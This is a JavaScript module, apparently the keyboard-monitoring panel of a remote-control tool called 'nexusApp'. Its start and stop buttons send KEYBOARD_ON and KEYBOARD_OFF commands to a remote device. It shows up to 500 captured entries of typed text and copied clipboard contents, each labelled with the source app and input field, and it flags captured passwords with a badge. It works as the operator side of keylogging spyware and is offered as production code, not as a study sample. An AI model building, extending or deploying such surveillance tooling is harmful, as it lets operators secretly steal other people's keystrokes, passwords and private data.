/**
 * Production-Grade Keyboard Monitoring Feature
 * Displays real-time keyboard input and clipboard monitoring
 */

if (!window.keyboardFeatureData) {
    window.keyboardFeatureData = {
        isActive: false,
        entries: []  // List of keyboard/clipboard entries
    };
}

class KeyboardFeature {
    constructor(container) {
        this.container = container;
        this.confirmationTimeout = null;
        this.data = window.keyboardFeatureData;
        
        this.init();
    }

    async init() {
        const html = await this.loadTemplate();
        this.container.innerHTML = html;

        await this.loadStyles();
        this.setupEventListeners();
        this.listenForKeyboard();

        if (this.data.isActive) {
            this.updateButton(true);
        }
        
        if (this.data.entries.length > 0) {
            this.renderEntries();
        }
    }

    async loadTemplate() {
        try {
            const response = await fetch('js/features/keyboard/keyboard.html');
            return await response.text();
        } catch (error) {
            console.error('Failed to load Keyboard template:', error);
            return '<div>Failed to load Keyboard feature</div>';
        }
    }

    async loadStyles() {
        try {
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = 'js/features/keyboard/keyboard.css';
            document.head.appendChild(link);
        } catch (error) {
            console.error('Failed to load Keyboard styles:', error);
        }
    }

    setupEventListeners() {
        const searchInput = this.container.querySelector('#keyboard-search');
        const playPauseBtn = this.container.querySelector('#keyboard-play-pause-btn');
        const clearBtn = this.container.querySelector('#keyboard-clear-btn');

        if (searchInput) {
            searchInput.addEventListener('input', (e) => this.filterEntries(e.target.value));
        }

        if (playPauseBtn) {
            playPauseBtn.addEventListener('click', () => this.togglePlayPause());
        }
        
        if (clearBtn) {
            clearBtn.addEventListener('click', () => this.clearEntries());
        }
    }

    listenForKeyboard() {
        window.addEventListener('keyboard-update', (event) => {
            const payload = event.detail;
            console.log('⌨️ Keyboard update received:', payload.type, payload.data);
            this.handleKeyboardUpdate(payload);
        });

        window.addEventListener('keyboard-confirmation', (event) => {
            const message = event.detail.message;
            console.log('⌨️ [Keyboard] Received confirmation:', message);
            
            if (message === 'KEYBOARD_STARTED') {
                this.clearConfirmationTimeout();
                this.data.isActive = true;
                this.updateButton(true);
                this.hideLoading();
            } else if (message === 'KEYBOARD_STOPPED') {
                this.clearConfirmationTimeout();
                this.data.isActive = false;
                this.updateButton(false);
                this.hideLoading();
            }
        });
    }

    handleKeyboardUpdate(payload) {
        const entry = {
            id: Date.now() + Math.random(),
            type: payload.type,
            ts: payload.ts || Date.now(),
            app: payload.data.app,
            appName: payload.data.appName,
            inputType: payload.data.inputType,
            text: payload.data.text,
            fieldHint: payload.data.fieldHint,
            isPassword: payload.data.isPassword || false
        };
        
        this.data.entries.unshift(entry);
        
        // Keep only last 500 entries
        if (this.data.entries.length > 500) {
            this.data.entries = this.data.entries.slice(0, 500);
        }
        
        this.renderEntries();
    }

    filterEntries(query) {
        const lowerQuery = query.toLowerCase();
        const listContainer = this.container.querySelector('#keyboard-entries-list');
        if (!listContainer) return;
        
        const items = listContainer.querySelectorAll('.keyboard-entry');
        items.forEach(item => {
            const appName = item.dataset.appName?.toLowerCase() || '';
            const text = item.dataset.text?.toLowerCase() || '';
            
            if (appName.includes(lowerQuery) || text.includes(lowerQuery)) {
                item.style.display = '';
            } else {
                item.style.display = 'none';
            }
        });
    }

    renderEntries() {
        const listContainer = this.container.querySelector('#keyboard-entries-list');
        if (!listContainer) return;
        
        listContainer.innerHTML = '';
        
        if (this.data.entries.length === 0) {
            listContainer.innerHTML = `
                <div class="list-placeholder">
                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <rect x="2" y="4" width="20" height="16" rx="2"></rect>
                        <path d="M6 8h.01M10 8h.01M14 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M6 16h.01M10 16h.01M14 16h.01M18 16h.01"></path>
                    </svg>
                    <p>No keyboard activity yet</p>
                    <p class="hint">Start monitoring to see keyboard input</p>
                </div>
            `;
            return;
        }
        
        this.data.entries.forEach(entry => {
            const item = this.createEntryItem(entry);
            listContainer.appendChild(item);
        });
    }

    createEntryItem(entry) {
        const div = document.createElement('div');
        div.className = `keyboard-entry ${entry.type.toLowerCase()}`;
        div.dataset.appName = entry.appName;
        div.dataset.text = entry.text || '';
        
        const time = this.formatTime(entry.ts);
        const typeLabel = entry.type === 'KEYBOARD_INPUT' ? 'Typed' : 'Copied';
        const typeIcon = entry.type === 'KEYBOARD_INPUT' ? '⌨️' : '📋';
        
        div.innerHTML = `
            <div class="entry-header">
                <div class="entry-type">${typeIcon} ${typeLabel}</div>
                <div class="entry-time">${time}</div>
            </div>
            <div class="entry-app">${this.escapeHtml(entry.appName)}</div>
            ${entry.fieldHint ? `<div class="entry-field">${this.escapeHtml(entry.fieldHint)}</div>` : ''}
            <div class="entry-text ${entry.isPassword ? 'password' : ''}">${this.escapeHtml(entry.text || '')}</div>
            <div class="entry-meta">
                <span class="entry-input-type">${entry.inputType}</span>
                ${entry.isPassword ? '<span class="password-badge">🔒 Password</span>' : ''}
            </div>
        `;
        
        return div;
    }

    clearEntries() {
        if (confirm('Clear all keyboard entries?')) {
            this.data.entries = [];
            this.renderEntries();
        }
    }

    togglePlayPause() {
        if (this.data.isActive) {
            this.stopMonitoring();
        } else {
            this.startMonitoring();
        }
    }

    startMonitoring() {
        console.log('⌨️ Starting keyboard monitoring');

        try {
            const app = window.nexusApp;
            if (!app || !app.connectionManager) {
                throw new Error('Connection manager not available');
            }

            this.clearConfirmationTimeout();
            this.showLoading();

            app.connectionManager.sendCommand('KEYBOARD_ON');

            console.log('✅ Keyboard monitoring command sent');

            this.confirmationTimeout = setTimeout(() => {
                if (this.container.querySelector('.loading-spinner')) {
                    console.warn('⚠️ [Keyboard] Confirmation timeout');
                    this.hideLoading();
                    this.showError('Keyboard monitoring start timeout');
                }
            }, 30000);

        } catch (error) {
            console.error('❌ Failed to start keyboard monitoring:', error);
            this.hideLoading();
            this.showError('Failed to start: ' + error.message);
        }
    }

    stopMonitoring() {
        console.log('⌨️ Stopping keyboard monitoring');

        try {
            const app = window.nexusApp;
            if (!app || !app.connectionManager) {
                throw new Error('Connection manager not available');
            }

            this.clearConfirmationTimeout();
            this.showLoading();

            app.connectionManager.sendCommand('KEYBOARD_OFF');

            console.log('✅ Keyboard monitoring stop command sent');

            this.confirmationTimeout = setTimeout(() => {
                if (this.container.querySelector('.loading-spinner')) {
                    console.warn('⚠️ [Keyboard] Confirmation timeout');
                    this.hideLoading();
                    this.showError('Keyboard monitoring stop timeout');
                }
            }, 30000);

        } catch (error) {
            console.error('❌ Failed to stop keyboard monitoring:', error);
            this.hideLoading();
        }
    }

    formatTime(timestamp) {
        const date = new Date(timestamp);
        const now = new Date();
        const diff = now - date;

        if (diff < 60000) return 'Just now';
        if (diff < 3600000) return `${Math.floor(diff / 60000)}m ago`;
        if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
        
        return date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
    }

    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    clearConfirmationTimeout() {
        if (this.confirmationTimeout) {
            clearTimeout(this.confirmationTimeout);
            this.confirmationTimeout = null;
        }
    }

    showLoading() {
        const playPauseBtn = this.container.querySelector('#keyboard-play-pause-btn');
        if (playPauseBtn) {
            playPauseBtn.innerHTML = `
                <svg class="loading-spinner" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <circle cx="12" cy="12" r="10" opacity="0.25"></circle>
                    <path d="M12 2 A10 10 0 0 1 22 12" opacity="0.75">
                        <animateTransform
                            attributeName="transform"
                            type="rotate"
                            from="0 12 12"
                            to="360 12 12"
                            dur="1s"
                            repeatCount="indefinite"/>
                    </path>
                </svg>
            `;
            playPauseBtn.disabled = true;
        }
    }

    hideLoading() {
        const playPauseBtn = this.container.querySelector('#keyboard-play-pause-btn');
        if (playPauseBtn) {
            playPauseBtn.disabled = false;
            
            if (this.data.isActive) {
                playPauseBtn.innerHTML = `
                    <svg class="pause-icon" viewBox="0 0 24 24" fill="currentColor">
                        <rect x="6" y="4" width="4" height="16"></rect>
                        <rect x="14" y="4" width="4" height="16"></rect>
                    </svg>
                `;
            } else {
                playPauseBtn.innerHTML = `
                    <svg class="play-icon" viewBox="0 0 24 24" fill="currentColor">
                        <polygon points="5 3 19 12 5 21 5 3"></polygon>
                    </svg>
                `;
            }
        }
    }

    updateButton(isActive) {
        this.hideLoading();
    }

    showError(message) {
        console.error('Keyboard error:', message);
    }

    destroy() {
        if (this.data.isActive) {
            this.stopMonitoring();
        }
    }
}

window.KeyboardFeature = KeyboardFeature;
